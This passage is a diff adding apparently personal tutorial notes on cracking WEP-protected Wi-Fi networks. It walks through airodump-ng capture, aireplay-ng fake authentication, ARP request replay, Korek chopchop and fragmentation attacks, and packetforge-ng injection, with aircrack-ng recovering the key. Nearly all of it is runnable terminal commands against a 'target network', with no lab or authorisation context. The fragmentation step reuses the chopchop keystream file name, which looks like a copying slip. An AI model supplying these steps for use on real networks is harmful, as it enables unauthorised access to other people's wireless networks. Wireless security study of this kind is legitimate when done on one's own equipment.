@@ -158,4 +158,76 @@ associated with it and problem is we r still unable to connect to the network, w
 look i want to communicate with u don't ignore my requests so it is similar to when to click on the network when u wants to connect
 to it and u still haven't put the password u r just telling the target network that I want to communicate with u and don't ignore me
 
-So to Associate to the target network
+So to Associate to the target network->
+cmd in terminal 1 -> airodump-ng --bssid target_network_bssid --channel channel_no --write file_name wlan0 // here #Data will increase
+// really very slow
+cmd in terminal 2 -> aireplay-ng --fakeauth 0 -a target_network_bssid -h MAC_address_of_my_wirless_adapter wlan0// this is to associate
+// to the network, in the MAC address of the wireless adapter replace '-' with ':', after executing the cmd u will see in the terminal 1
+the wireless adapter MAC address to be appearing as the devices associated to the network
+
+So here we got associated to the network and if u send anything it's gonna accept it and it's going to communicate with u not u r still
+not connected to the network, u still cannot use the internet from the network
+
+Now we will start injecting packets into the traffic to force the access point to generate new packets with new initialization vectors,
+this will increase the number of data very quickly and allow us to crack WEP networks even if the network was not buzy, Their r no. of
+ways to do this but one of the most reliable way is using the ARP Request Replay Attack
+
+ARP Request Replay Attack ->
+The idea behind this method is to wait for the ARP packet and once this packet is sent into network we r going to capture it and then
+retransmit it and once we do this the router is forced to generate a new packet with a new initialization vector, So by repeating this
+process we will be forcing the router to continously generate new packets with new initialization vectors then once we have enough of
+the initialization vectors we can run aircrack-ng just like before and crack the key
+
+cmd in terminal 1 -> airodump-ng --bssid target_network_bssid --channel channel_no --write file_name wlan0
+cmd in terminal 2 -> aireplay-ng --fakeauth 0 -a target_network_bssid -h MAC_address_of_my_wirless_adapter wlan0
+cmd in terminal 3 -> aireplay-ng --arpreplay -b target_network_bssid -h MAC_address_of_my_wirless_adapter wlan0 // this will
+// execute the ARP Request Replay Attack, the #Data in terminal 1 will increase very quickly which means we manage to capture the
+// ARP packet and ARP Request Replay Attack is running as aspected
+cmd in terminal 2 again ->aircrack-ng file_name-01.cap // this will say in output as the key is found, their could be the case that
+// it require more data packets and the reason for this is that u modified the settings of the network so that it use a 128 bit key
+// bcz in WEP u can either use 64bit or 128 bit key
+
+Korek Chopchop Attack -> Another method of increasing the data rapidly in network that has no clients associated with it or it has very
+low traffic Korek Chopchop Attack, this attack sometimes might work and sometimes not
+In this method instead of directly injecting the ARP packet that we capture we r gonna try to determine the history for this packet,
+once we do do that we gonna create a new packet, So we gonna forge a new packet and inject this new packet into the traffic and this
+will force the access point to create a new packet with a new initialization vector, we gonna capture it and inject it back into the
+traffic we gonna keep doing this untill the no. of data is high enough to crack through a key
+
+cmd in terminal 1 -> airodump-ng --bssid target_network_bssid --channel channel_no --write file_name wlan0
+cmd in terminal 2 -> aireplay-ng --fakeauth 0 -a target_network_bssid -h MAC_address_of_my_wirless_adapter wlan0
+cmd in terminal 3 -> aireplay-ng --chopchop -b target_network_bssid -h MAC_address_of_my_wirless_adapter wlan0 // this will execute
+// the chop chop attack, while execution it is going to ask u that if u want to decrypt and determine it's keystream for which enter
+// 'y' for yes, the keystream would we got saved into a file after execution is completed and it's name would be shown to u at the
+// end of the execution
+cmd in terminal 3 again -> packetforge-ng -0 -a target_network_bssid -h MAC_address_of_my_wirless_adapter -k 255.255.255.255
+                          -l 255.255.255.255 -y keystreamfile_obtained_by_chopchop_attack -w name_of_the_forged_packet
+//-k 255.255.255.255 represents the destination IP and -l 255.255.255.255 is the source
+
+Next step is to inject this forged packet into the traffic and cause the no. of data to increase rapidly
+
+cmd in terminal 2 again -> aireplay-ng --fakeauth 0 -a target_network_bssid -h MAC_address_of_my_wirless_adapter wlan0
+cmd in terminal 3 again -> aireplay-ng -2 -r name_of_the_forged_packet wlan0 // here -2 is for replay and this will inject the packet
+// it will ask u while execution if u want to use this packet so enter 'y' for yes
+// here the higher the percentage of keystream u obtained during the first time execution of the cmd in the terminal 3 the more chances
+// their will be of ur success and if ur #Data in terminal 1 is increasing quickly then it means the attack was successfull
+cmd in terminal 2 again ->aircrack-ng file_name-01.cap //this will say in output as the key is found
+
+Fragmentation Attack -> In this attack we have to obtain 1500 bytes of the PRGA(pseudo random generation algorithm), we need to be 
+closer to the target network to successfully run this attack but it's much quicker then the chop chop attack, after obtaining the
+PRGA we can use it to forge a new packet which can be injected into the traffic to generate new initialization vector
+So concept is simple we gonna capture a packet determines it's PRGA, forge a new packet and then inject that packet into the air
+
+cmd in terminal 1 -> airodump-ng --bssid target_network_bssid --channel channel_no --write file_name wlan0
+cmd in terminal 2 -> aireplay-ng --fakeauth 0 -a target_network_bssid -h MAC_address_of_my_wirless_adapter wlan0
+cmd in terminal 3 -> aireplay-ng --fragment -b target_network_bssid -h MAC_address_of_my_wirless_adapter wlan0 // this will execute
+// the fragmentation attack, after getting the packet while execution it is going to ask if u want to use it then type 'y' after which
+// it will try to determine the PRGA, if in the case that packet wasn't usefull it will ask it will wait for another packet to use
+// and ask u again if u want to use this packet then type 'y' do this untill the keystream is generated and the file name for the
+// keystream appears at the end of the execution
+cmd in terminal 3 again -> packetforge-ng -0 -a target_network_bssid -h MAC_address_of_my_wirless_adapter -k 255.255.255.255
+                          -l 255.255.255.255 -y keystreamfile_obtained_by_chopchop_attack -w name_of_the_forged_packet
+cmd in terminal 2 again -> aireplay-ng --fakeauth 0 -a target_network_bssid -h MAC_address_of_my_wirless_adapter wlan0
+cmd in terminal 3 again -> aireplay-ng -2 -r name_of_the_forged_packet wlan0 // here -2 is for replay and this will inject the packet
+
+
